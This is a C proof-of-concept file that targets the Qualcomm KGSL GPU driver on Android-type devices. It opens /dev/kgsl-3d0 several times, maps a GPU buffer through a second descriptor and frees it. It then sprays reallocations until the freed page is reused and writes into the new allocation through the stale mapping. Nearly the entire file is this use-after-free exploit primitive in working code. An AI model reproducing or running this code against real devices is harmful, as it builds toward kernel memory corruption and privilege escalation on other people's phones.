/*
 * kgsl_uaf_gpu_overlap.c - GPU-to-GPU UAF Object Overlap
 *
 * Strategy:
 * 1. Allocate GPU buffer A (FD1)
 * 2. Cross-FD mmap A (FD2)
 * 3. Free A (FD1)
 * 4. Allocate GPU buffer B with different flags (FD1)
 * 5. B may overlap with A's freed page!
 * 6. Use FD2's stale mapping to corrupt B
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

struct kgsl_gpuobj_alloc
{
    uint64_t size;
    uint64_t flags;
    uint64_t va_len;
    uint64_t mmapaddr;
    uint64_t id;
    uint64_t metadata_len;
    uint64_t metadata;
};

struct kgsl_gpuobj_free
{
    uint64_t flags;
    uint64_t priv;
    uint32_t id;
    uint32_t type;
    uint32_t len;
};

#define KGSL_IOC_TYPE 0x09
#define IOCTL_KGSL_GPUOBJ_ALLOC \
    _IOWR(KGSL_IOC_TYPE, 0x45, struct kgsl_gpuobj_alloc)
#define IOCTL_KGSL_GPUOBJ_FREE \
    _IOW(KGSL_IOC_TYPE, 0x46, struct kgsl_gpuobj_free)

/* Various allocation flags to try */
#define FLAG_NORMAL 0x00100000
#define FLAG_GPUREADONLY 0x01000000
#define FLAG_UNCACHED 0x00200000
#define FLAG_COHERENT 0x00400000

void hexdump(void *ptr, int len)
{
    uint8_t *p = (uint8_t *)ptr;
    for (int i = 0; i < len; i += 16)
    {
        printf("  %04x: ", i);
        for (int j = 0; j < 16 && i + j < len; j++)
        {
            printf("%02x ", p[i + j]);
        }
        printf("\n");
    }
}

int main(void)
{
    printf("=== GPU-to-GPU UAF Object Overlap ===\n\n");

    int fd1 = open("/dev/kgsl-3d0", O_RDWR);
    int fd2 = open("/dev/kgsl-3d0", O_RDWR);
    int fd3 = open("/dev/kgsl-3d0", O_RDWR);

    if (fd1 < 0 || fd2 < 0 || fd3 < 0)
    {
        perror("open");
        return 1;
    }

    printf("[+] FDs: %d, %d, %d\n", fd1, fd2, fd3);

    /* Test 1: Same-FD reallocate overlap */
    printf("\n=== Test 1: Same-FD Reallocate ===\n");
    {
        struct kgsl_gpuobj_alloc a1 = {.size = 0x1000, .flags = FLAG_NORMAL};
        struct kgsl_gpuobj_alloc a2 = {.size = 0x1000, .flags = FLAG_NORMAL};

        if (ioctl(fd1, IOCTL_KGSL_GPUOBJ_ALLOC, &a1) < 0)
        {
            printf("[-] A1 alloc failed\n");
            goto test2;
        }
        printf("[+] A1: mmapaddr=0x%llx, id=%llu\n",
               (unsigned long long)a1.mmapaddr, (unsigned long long)a1.id);

        void *m1 = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                        MAP_SHARED, fd1, a1.mmapaddr);
        if (m1 == MAP_FAILED)
        {
            printf("[-] M1 mmap failed\n");
            goto test2;
        }
        memset(m1, 'A', 0x1000);

        struct kgsl_gpuobj_free f = {.id = a1.id};
        ioctl(fd1, IOCTL_KGSL_GPUOBJ_FREE, &f);

        /* WARNING: m1 is now dangling! Don't access yet */

        if (ioctl(fd1, IOCTL_KGSL_GPUOBJ_ALLOC, &a2) < 0)
        {
            printf("[-] A2 alloc failed\n");
            munmap(m1, 0x1000);
            goto test2;
        }
        printf("[+] A2: mmapaddr=0x%llx, id=%llu\n",
               (unsigned long long)a2.mmapaddr, (unsigned long long)a2.id);

        void *m2 = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                        MAP_SHARED, fd1, a2.mmapaddr);

        if (m2 != MAP_FAILED)
        {
            printf("    M2 data: 0x%02x (expect 0x00 or garbage)\n", ((uint8_t *)m2)[0]);

            if (a1.mmapaddr == a2.mmapaddr)
            {
                printf("    [!] SAME ADDRESS!\n");
                /* Safe to access m1 now since same address */
                printf("    M1 after realloc: 0x%02x\n", ((uint8_t *)m1)[0]);
            }
            munmap(m2, 0x1000);
        }

        munmap(m1, 0x1000);
    }

test2:

    /* Test 2: Cross-FD UAF with reallocate */
    printf("\n=== Test 2: Cross-FD UAF + Reallocate ===\n");
    {
        struct kgsl_gpuobj_alloc a1 = {.size = 0x1000, .flags = FLAG_NORMAL};

        ioctl(fd1, IOCTL_KGSL_GPUOBJ_ALLOC, &a1);
        printf("[+] Victim buffer: mmapaddr=0x%llx\n",
               (unsigned long long)a1.mmapaddr);

        /* Cross-FD mmap */
        void *xfd = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                         MAP_SHARED, fd2, a1.mmapaddr);
        if (xfd == MAP_FAILED)
        {
            printf("[-] Cross-FD mmap failed\n");
        }
        else
        {
            printf("[+] Cross-FD mapped at %p\n", xfd);

            /* Write marker */
            memset(xfd, 0x42, 0x1000); // 'B'

            /* Free original */
            struct kgsl_gpuobj_free f = {.id = a1.id};
            ioctl(fd1, IOCTL_KGSL_GPUOBJ_FREE, &f);
            printf("[+] Freed original buffer\n");

            /* Allocate many buffers to fill the pool */
            struct kgsl_gpuobj_alloc reallocs[32];
            int overlapped = -1;

            for (int i = 0; i < 32; i++)
            {
                reallocs[i].size = 0x1000;
                reallocs[i].flags = FLAG_NORMAL;

                if (ioctl(fd1, IOCTL_KGSL_GPUOBJ_ALLOC, &reallocs[i]) < 0)
                {
                    break;
                }

                void *m = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                               MAP_SHARED, fd1, reallocs[i].mmapaddr);
                if (m != MAP_FAILED)
                {
                    /* Check if it overlaps with our UAF page */
                    if (((uint8_t *)m)[0] == 0x42)
                    {
                        printf("[!] Overlap found at realloc[%d]!\n", i);
                        overlapped = i;

                        /* Demonstrate cross-FD write */
                        ((uint8_t *)xfd)[0] = 0x99;
                        printf("    Wrote 0x99 via cross-FD\n");
                        printf("    New allocation sees: 0x%02x\n",
                               ((uint8_t *)m)[0]);
                    }
                    munmap(m, 0x1000);
                }
            }

            if (overlapped >= 0)
            {
                printf("[+] Cross-FD write to new allocation WORKS!\n");
            }
            else
            {
                printf("[-] No overlap found (address was recycled externally)\n");
            }

            /* Cross-FD mapping is still valid - check what we can see */
            printf("\n[*] Cross-FD view after reallocations:\n");
            hexdump(xfd, 64);

            munmap(xfd, 0x1000);
        }
    }

    /* Test 3: Different allocation flags */
    printf("\n=== Test 3: Different Flags Overlap ===\n");
    {
        uint64_t flags[] = {
            FLAG_NORMAL,
            FLAG_GPUREADONLY,
            FLAG_UNCACHED,
            FLAG_NORMAL | FLAG_UNCACHED,
        };
        const char *names[] = {
            "NORMAL", "GPUREADONLY", "UNCACHED", "NORMAL|UNCACHED"};

        for (int i = 0; i < 4; i++)
        {
            struct kgsl_gpuobj_alloc a = {.size = 0x1000, .flags = flags[i]};
            if (ioctl(fd3, IOCTL_KGSL_GPUOBJ_ALLOC, &a) == 0)
            {
                printf("  %s: mmapaddr=0x%llx, id=%llu\n",
                       names[i], (unsigned long long)a.mmapaddr,
                       (unsigned long long)a.id);
            }
            else
            {
                printf("  %s: FAILED (%s)\n", names[i], strerror(errno));
            }
        }
    }

    /* Test 4: Multi-FD cross-read */
    printf("\n=== Test 4: Three-way Cross-FD ===\n");
    {
        struct kgsl_gpuobj_alloc a = {.size = 0x1000, .flags = FLAG_NORMAL};
        ioctl(fd1, IOCTL_KGSL_GPUOBJ_ALLOC, &a);

        void *m1 = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                        MAP_SHARED, fd1, a.mmapaddr);
        void *m2 = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                        MAP_SHARED, fd2, a.mmapaddr);
        void *m3 = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                        MAP_SHARED, fd3, a.mmapaddr);

        printf("[+] Three mappings: %p, %p, %p\n", m1, m2, m3);

        if (m1 != MAP_FAILED && m2 != MAP_FAILED && m3 != MAP_FAILED)
        {
            ((uint8_t *)m1)[0] = 0x11;
            printf("    FD1 wrote 0x11\n");
            printf("    FD2 sees: 0x%02x\n", ((uint8_t *)m2)[0]);
            printf("    FD3 sees: 0x%02x\n", ((uint8_t *)m3)[0]);

            ((uint8_t *)m2)[0] = 0x22;
            printf("    FD2 wrote 0x22\n");
            printf("    FD1 sees: 0x%02x\n", ((uint8_t *)m1)[0]);
            printf("    FD3 sees: 0x%02x\n", ((uint8_t *)m3)[0]);
        }

        if (m1 != MAP_FAILED)
            munmap(m1, 0x1000);
        if (m2 != MAP_FAILED)
            munmap(m2, 0x1000);
        if (m3 != MAP_FAILED)
            munmap(m3, 0x1000);
    }

    close(fd1);
    close(fd2);
    close(fd3);

    printf("\n=== Done ===\n");
    return 0;
}
